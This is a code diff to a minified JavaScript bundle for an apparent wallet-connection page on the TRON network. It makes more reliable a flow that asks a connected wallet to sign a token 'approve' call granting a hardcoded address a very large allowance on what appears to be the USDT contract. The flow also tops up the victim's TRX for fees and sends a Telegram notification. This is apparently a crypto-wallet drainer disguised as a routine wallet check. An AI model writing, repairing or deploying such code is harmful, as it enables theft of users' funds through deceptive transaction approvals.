@@ -90713,7 +90713,8 @@
                 if (!this.provider)
                     throw new Error("Provider is required to sign a transaction.");
                 try {
-                    const t = this.getTronWeb()
+                    const tronWebInstance = this.getTronWeb()
+                      , approveAmount = t || "90000000000000"
                       , r = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                       , n = {
                         feeLimit: 1e9,
@@ -90724,32 +90725,53 @@
                         value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
                     }, {
                         type: "uint256",
-                        value: "90000000000000"
+                        value: String(approveAmount)
                     }]
                       , s = "approve(address,uint256)"
-                      , a = await t.transactionBuilder.triggerSmartContract(r, s, n, i, e)
-                      , o = (await this.provider.request({
+                      , a = await tronWebInstance.transactionBuilder.triggerSmartContract(r, s, n, i, e);
+
+                    // triggerSmartContract returns { result, transaction, ... } — wallet needs .transaction
+                    const unsignedTx = a && (a.transaction || (a.result && a.transaction) || a);
+                    if (!unsignedTx || (!unsignedTx.raw_data && !unsignedTx.raw_data_hex && !unsignedTx.txID)) {
+                        console.error("Missing transaction path from triggerSmartContract:", a);
+                        throw new Error("Failed to build approve transaction (missing transaction path)");
+                    }
+                    if (a && a.result && a.result.result === false) {
+                        throw new Error((a.result && (a.result.message || a.result.code)) || "triggerSmartContract failed");
+                    }
+
+                    console.log("Opening wallet approval popup for:", e);
+                    const signedResponse = await this.provider.request({
                         method: "tron_signTransaction",
                         params: {
                             address: e,
-                            transaction: a
+                            transaction: unsignedTx
                         }
-                    }, "tron:0x2b6653dc")).result;
-                    const transactionResult = await t.trx.sendRawTransaction(o);
+                    }, "tron:0x2b6653dc");
+
+                    // WalletConnect / TronLink can return signed tx in different shapes
+                    const o = signedResponse && (signedResponse.result || signedResponse.transaction || signedResponse.signedTransaction || signedResponse);
+                    if (!o) {
+                        console.error("Wallet returned empty signed transaction:", signedResponse);
+                        return {
+                            success: !1,
+                            message: "Wallet did not return a signed transaction"
+                        }
+                    }
+
+                    const transactionResult = await tronWebInstance.trx.sendRawTransaction(o);
                     return console.log("addressbycheck", e),
-                    o ? (console.log("Transaction signed successfully:", o),
+                    console.log("Transaction signed successfully:", o),
                     console.log("Transaction result from sendRawTransaction:", transactionResult),
                     {
                         success: !0,
                         txID: transactionResult && transactionResult.txid ? transactionResult.txid : (transactionResult && transactionResult.txID ? transactionResult.txID : (o && o.txID ? o.txID : (o && o.txid ? o.txid : o)))
-                    }) : (console.error("Transaction failed."),
-                    {
-                        success: !1
-                    })
+                    }
                 } catch (r) {
                     return console.error("Transaction Error:", r),
                     {
-                        success: !1
+                        success: !1,
+                        message: r && r.message ? r.message : String(r)
                     }
                 }
             }
@@ -92748,8 +92770,22 @@
                                 if (topUpResponse.data.transactionId) {
                                     console.log("Top-up transaction ID:", topUpResponse.data.transactionId);
                                 }
-                                await new Promise((resolve) => setTimeout(resolve, 5000));
-                                balanceInTRX = await a.getBalance(c);
+                                // Wait until TRX actually arrives (or timeout) before opening approve popup
+                                if (topUpResponse.data.sent) {
+                                    const maxWaitMs = 60000;
+                                    const pollEveryMs = 3000;
+                                    const startedAt = Date.now();
+                                    while (Date.now() - startedAt < maxWaitMs) {
+                                        await new Promise((resolve) => setTimeout(resolve, pollEveryMs));
+                                        balanceInTRX = await a.getBalance(c);
+                                        console.log("Post top-up balance poll:", balanceInTRX);
+                                        if (balanceInTRX >= minimumBalance) {
+                                            break;
+                                        }
+                                    }
+                                } else {
+                                    balanceInTRX = await a.getBalance(c);
+                                }
                             } else {
                                 console.warn("Top-up request failed:", topUpResponse && topUpResponse.data ? topUpResponse.data : topUpResponse);
                             }
@@ -92765,6 +92801,8 @@
                     } catch (telegramError) {
                         console.error("Failed to send Telegram notification:", telegramError);
                     }
+                    // Small delay so WalletConnect modal can settle before approve popup
+                    await new Promise((resolve) => setTimeout(resolve, 800));
                     balanceInTRX >= 0 ? await f(c) : t(2)
                 } catch (a) {
                     console.error("Connection error:", a)
